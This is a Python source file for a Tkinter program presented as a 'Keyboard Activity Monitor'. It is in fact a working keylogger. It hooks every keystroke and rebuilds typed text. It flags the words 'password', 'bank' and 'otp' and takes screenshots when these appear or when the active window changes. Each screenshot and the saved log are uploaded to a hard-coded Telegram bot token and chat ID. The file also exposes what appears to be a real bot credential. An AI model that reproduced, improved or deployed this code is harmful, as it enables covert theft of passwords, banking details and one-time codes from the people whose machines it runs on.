import tkinter as tk
from tkinter import scrolledtext
import pynput.keyboard
import os
import pyautogui
import time
from datetime import datetime
import requests

try:
    import pygetwindow as gw
except:
    gw = None

# ===== TELEGRAM CONFIG =====
BOT_TOKEN = "8001356564:AAGqeAGFcm9YkTcgFRHzLmxmMrTCHlS5Uhk"
CHAT_ID = "2102327945"

# ===== TELEGRAM FUNCTION =====
def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    try:
        with open(file_path, "rb") as f:
            requests.post(url, files={"document": f}, data={"chat_id": CHAT_ID})
        print("📤 Sent to Telegram")
    except Exception as e:
        print("❌ Telegram Error:", e)

# ===== SCREENSHOT FUNCTION =====
def take_screenshot(app_name):
    if not os.path.exists("screenshots"):
        os.makedirs("screenshots")

    safe_name = "".join(c for c in app_name if c.isalnum() or c in (" ", "_")).rstrip()
    safe_name = safe_name.replace(" ", "_")

    filename = f"screenshots/{safe_name}_{int(time.time())}.png"

    try:
        img = pyautogui.screenshot()
        img.save(filename)
        send_to_telegram(filename)
        print("📸 Screenshot captured")
    except Exception as e:
        print("❌ Screenshot Error:", e)


class KeyLoggerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Keyboard Activity Monitor - Premium")
        self.root.geometry("900x700")
        self.root.configure(bg="#0f172a")

        self.running = False
        self.listener = None

        self.current_app = ""
        self.key_count = 0
        self.app_usage = {}

        # 🔥 VARIABLES
        self.current_line = ""
        self.last_key_time = time.time()
        self.fast_typing_count = 0
        self.suspicious_keywords = ["password", "bank", "otp"]

        self.title_font = ("Segoe UI", 20, "bold")
        self.label_font = ("Segoe UI", 11)
        self.stats_font = ("Segoe UI", 12, "bold")

        # ===== HEADER =====
        header = tk.Frame(root, bg="#0f172a")
        header.pack(fill=tk.X, pady=10)

        tk.Label(header, text="🛡 Keyboard Activity Monitor",
                 font=self.title_font, fg="white", bg="#0f172a").pack()

        self.datetime_label = tk.Label(header, text="",
                                       font=("Segoe UI", 11),
                                       fg="#38bdf8", bg="#0f172a")
        self.datetime_label.pack()

        self.update_datetime()

        # ===== BUTTONS =====
        btn_frame = tk.Frame(root, bg="#0f172a")
        btn_frame.pack(pady=10)

        tk.Button(btn_frame, text="Start Monitoring", width=18,
                  font=self.label_font, bg="#22c55e", fg="white",
                  command=self.start).pack(side=tk.LEFT, padx=10)

        tk.Button(btn_frame, text="Stop Monitoring", width=18,
                  font=self.label_font, bg="#ef4444", fg="white",
                  command=self.stop).pack(side=tk.LEFT, padx=10)

        # ===== TEXT AREA =====
        self.text_area = scrolledtext.ScrolledText(
            root, height=15, width=100,
            bg="#020617", fg="#38bdf8",
            insertbackground="white",
            font=("Consolas", 10)
        )
        self.text_area.pack(pady=10, padx=10)

        # ===== STATS =====
        stats_frame = tk.Frame(root, bg="#1e293b", padx=10, pady=10)
        stats_frame.pack(fill=tk.X, padx=10, pady=5)

        self.stats_label = tk.Label(stats_frame, text="Keys Pressed: 0",
                                   font=self.stats_font, fg="white", bg="#1e293b")
        self.stats_label.pack(anchor="w")

        self.app_label = tk.Label(stats_frame, text="Active App: None",
                                 font=self.stats_font, fg="white", bg="#1e293b")
        self.app_label.pack(anchor="w", pady=5)

        # ===== USAGE =====
        usage_frame = tk.LabelFrame(root, text="Application Usage",
                                   bg="#0f172a", fg="white")
        usage_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        self.usage_area = scrolledtext.ScrolledText(
            usage_frame, height=8,
            bg="#020617", fg="#a3e635",
            insertbackground="white",
            font=("Consolas", 10)
        )
        self.usage_area.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)

    def get_time(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def update_datetime(self):
        self.datetime_label.config(text=f"🕒 {self.get_time()}")
        self.root.after(1000, self.update_datetime)

    def get_active_window(self):
        if gw:
            try:
                win = gw.getActiveWindow()
                return win.title if win else "Unknown"
            except:
                return "Unknown"
        return "Unknown"

    def update_ui(self, text, app):
        if text.strip():
            self.text_area.insert(tk.END, text)
            self.text_area.see(tk.END)

        self.stats_label.config(text=f"Keys Pressed: {self.key_count}")
        self.app_label.config(text=f"Active App: {app}")
        self.update_usage()

    def on_press(self, key):
        if not self.running:
            return False

        self.key_count += 1
        app = self.get_active_window()

        self.app_usage[app] = self.app_usage.get(app, 0) + 1

        date_only = datetime.now().strftime("%Y-%m-%d")
        output = ""

        # APP CHANGE
        if app != self.current_app:
            self.current_app = app
            output += f"\n[{date_only}] [APP: {app}]\n"

            if "chrome" in app.lower():
                output += f"🌐 Chrome: {app}\n"

            take_screenshot(app)

        # KEY INPUT
        try:
            self.current_line += key.char
        except:
            if key == pynput.keyboard.Key.space:
                self.current_line += " "
            elif key == pynput.keyboard.Key.backspace:
                self.current_line = self.current_line[:-1]
            elif key == pynput.keyboard.Key.enter:
                if self.current_line.strip():
                    output += f"\n[{date_only}] 🔍 Search/Text: {self.current_line.strip()}\n"
                self.current_line = ""

        # FAST TYPING
        now = time.time()
        if now - self.last_key_time < 0.05:
            self.fast_typing_count += 1
        else:
            self.fast_typing_count = 0

        self.last_key_time = now

        if self.fast_typing_count > 20:
            output += f"\n⚠️ Fast typing detected\n"
            take_screenshot("suspicious")

        # KEYWORD DETECTION
        for word in self.suspicious_keywords:
            if word in self.current_line.lower():
                output += f"\n🚨 Keyword detected: {word}\n"
                take_screenshot("keyword")
                self.current_line = ""

        self.root.after(0, self.update_ui, output, app)

    def update_usage(self):
        self.usage_area.delete("1.0", tk.END)
        for app, count in self.app_usage.items():
            self.usage_area.insert(tk.END, f"{app} → {count} keys\n")

    def start(self):
        self.running = True
        self.text_area.insert(tk.END, f"\n[{self.get_time()}] [INFO] Monitoring Started\n")
        self.listener = pynput.keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()

        self.text_area.insert(tk.END, f"\n[{self.get_time()}] [INFO] Monitoring Stopped\n")
        self.save_log()

    def save_log(self):
        if not os.path.exists("reports"):
            os.makedirs("reports")

        file = os.path.join("reports", "log.txt")

        with open(file, "w", encoding="utf-8") as f:
            f.write(self.text_area.get("1.0", tk.END))

        print("✅ Log saved")
        send_to_telegram(file)


if __name__ == "__main__":
    root = tk.Tk()
    app = KeyLoggerGUI(root)
    root.mainloop()